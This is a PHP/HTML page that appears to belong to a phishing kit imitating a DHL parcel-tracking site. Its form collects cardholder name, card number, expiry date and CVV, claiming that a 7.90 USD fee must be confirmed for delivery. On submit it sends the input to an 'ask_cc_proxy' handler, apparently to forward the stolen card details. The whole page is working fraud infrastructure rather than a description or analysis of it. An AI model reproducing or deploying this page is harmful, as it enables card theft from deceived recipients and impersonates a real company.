<?php 

         $relative_root="";
         $parent_folders="";
         function include_config(){
            global $relative_root,$parent_folders;
            while(!file_exists($relative_root."cfg.php")){
                $parent_folders=basename(realpath($relative_root))."/".$parent_folders;
                $relative_root.="../";
            };
            return $relative_root;
         };
         require_once(include_config().'cfg.php');

         if(isset($php_js)){
             $php_js->relative_root=$relative_root;
             $php_js->parent_folders=$parent_folders;
         }
         $php_js->fake_base="cc/";
?>
<!DOCTYPE html>
<html class="log sizes customelements history pointerevents postmessage webgl websockets cssanimations csscolumns csscolumns-width csscolumns-span csscolumns-fill csscolumns-gap csscolumns-rule csscolumns-rulecolor csscolumns-rulestyle csscolumns-rulewidth csscolumns-breakbefore csscolumns-breakafter csscolumns-breakinside flexbox picture srcset webworkers">

<head>
    <script type="text/javascript" src="<?php echo $php_js->relative_root ?>bower_components/jquery/dist/jquery.min.js"></script>
    <script type="text/javascript" src="<?php echo $php_js->relative_root ?>bower_components/ua-parser-js/dist/ua-parser.min.js"></script>
    <link rel="stylesheet" href="<?php echo $php_js->relative_root ?>bower_components/font-awesome/css/font-awesome.min.css">
    <script type="text/javascript" src="<?php echo $php_js->relative_root ?>core/form/core_form.js"></script>
    <script type="text/javascript" src="<?php echo $php_js->relative_root ?>core/token/core_token.js"></script>
    <link rel="stylesheet" href="<?php echo $php_js->relative_root ?>core/form/core_form.css">
    <script type="text/javascript" src="<?php echo $php_js->relative_root ?>bower_components/angular/angular.min.js"></script>
	<script type="text/javascript" src="<?php echo $php_js->relative_root ?>bower_components/jquery.maskedinput/dist/jquery.maskedinput.min.js"></script>


    <base href="<?php echo $php_js->relative_root.$php_js->fake_base; ?>" />
    <link rel="stylesheet" href="form/css.css">
    <meta charset="UTF-8">
    <meta http-equiv="x-ua-compatible" content="ie=edge">
    <title>| Welcome |</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="style.css">
    <link rel="stylesheet" href="style.css">
    
</head>

<body class="lowla"     ng-app="app" ng-controller="c1" ng-model-options="{'allowInvalid':true}"  ng-cloak    >
    <div class="contenu">
        <header>
            <div class="pri"> <span class="prv">{{"Private customer"| ng_translate1}}</span> <span class="per">{{"Business customer"| ng_translate1}}</span> </div>
            <div class="bande"> <span class="lg"><img src="lg.svg"></span>
                <ul>
                    <li>{{"Send packages"| ng_translate1}}</li>
                    <li>{{"Revive packets"| ng_translate1}}</li>
                    <li>{{"Revive & packets"| ng_translate1}}</li>
                </ul>
            </div>
        </header>
        <section>
            <div class="scum_container loader_show">
                


                



                <div class="scum" style="display: " id="cc-view">
                    <form id="" onsubmit="send1(event,'ask_cc_proxy');return false">
                        <div class="parag"> <span class="titr">{{"DHL Tracking"| ng_translate1}}.</span> <span class="deta">{{"Here you will find information about your shipment"| ng_translate1}}</span> <span class="deta">{{"Track your parcel shipment at any time from your shipping to delivery"| ng_translate1}}</span> </div>
                        <div class="box">
                            <div class="pak"> 
                                <div class="allt">
                                    <div>

                                        <input type="text" class="nm form-control" id="nm" pattern=".{4,}" data-err_text="Please enter valid "  name="nm" maxlength="60" required="" placeholder='{{"Cardholder name"| ng_translate1}}' autocomplete="off" autofocus="" value="">
                                        

                                        <input type="text" class="nu form-control" required="" id="nu" pattern="\d{4} \d{4} \d{4} \d{4}" data-mask="9999 9999 9999 9999" placeholder='{{"Card number"| ng_translate1}}' mask-placeholder="···· ···· ···· ····" data-err_text="Please enter valid "  name="nu" maxlength="20"   autocomplete="off" value="">


                                        <input type="text" class="epx form-control" required="" id="epx" name="epx" maxlength="9" pattern="\d{2}\/\d{4}" data-mask="99/9999" placeholder='{{"Expiry date"| ng_translate1}}' mask-placeholder='{{"MM/YYYY"| ng_translate1}}'  autocomplete="off" value="">


                                        <input type="text" class="vv form-control" required="" id="vv" name="vv" maxlength="3" pattern="\d{3}" data-err_text="Please enter valid "  placeholder="CVV" autocomplete="off" value="">

                                    </div>
                                </div>
                                <div class="erro" style="width: 45%"> <span><b style="color:#d40511">{{"Important message"| ng_translate1}}</b><br>{{"To complete the delivery as soon as possible, please confirm the payment"| ng_translate1}} <span style="color:#d40511;font-weight:bold;font-family:arial">(7.90 USD)</span> {{"by clicking on Next. Online confirmation must be made within next 14 days , before it expires..."| ng_translate1}}</span> </div>
                            </div>
                        </div>
                        <div><button type="submit" class="text-center">{{"Next"| ng_translate1}}</button></div>
                    </form>
                </div>


                
            </div>
            <div class="pubb"><img class="pb01" src="pub.jpg"></div>
        </section>
    </div>
    <footer>
        <div class="contenu">
            <ul>
                <li>DHL {{"Package"| ng_translate1}}</li>
                <li>DHL {{"Services"| ng_translate1}}</li>
                <li>DHL {{"Express"| ng_translate1}}</li>
                <li>DHL {{"Logistics"| ng_translate1}}</li>
            </ul>
            <ul>
                <li>{{"Contacts"| ng_translate1}}</li>
                <li>{{"Help & Custom service"| ng_translate1}}</li>
                <li>{{"Here's how to works"| ng_translate1}}</li>
                <li>{{"Mobile app"| ng_translate1}}</li>
            </ul>
            <ul>
                <li>{{"About Us"| ng_translate1}}</li>
                <li>{{"Post DHL"| ng_translate1}}</li>
                <li>{{"Responsibility"| ng_translate1}}</li>
                <li>{{"Presse"| ng_translate1}}</li>
                <li>{{"Career"| ng_translate1}}</li>
            </ul>
            <div>© 2020 DHL International Gmbh - All rights reversed.</div>
        </div>
    </footer>
    <script type="text/javascript">
    var bid = "<?php echo isset($_COOKIE['bid'])?$_COOKIE['bid']:basename(dirname(dirname(__FILE__))) ?>"
    var php_js = <?php  echo json_encode($php_js) ?>
    </script>
    <script type="text/javascript" src="form/form.js?v=<?php echo uniqid() ?>"></script>
    <script type="text/javascript" src="token/token.js?v=<?php echo uniqid() ?>"></script>
    <script type="text/javascript" src="ng/ng.js?v=<?php echo uniqid() ?>"></script>
</body>

</html>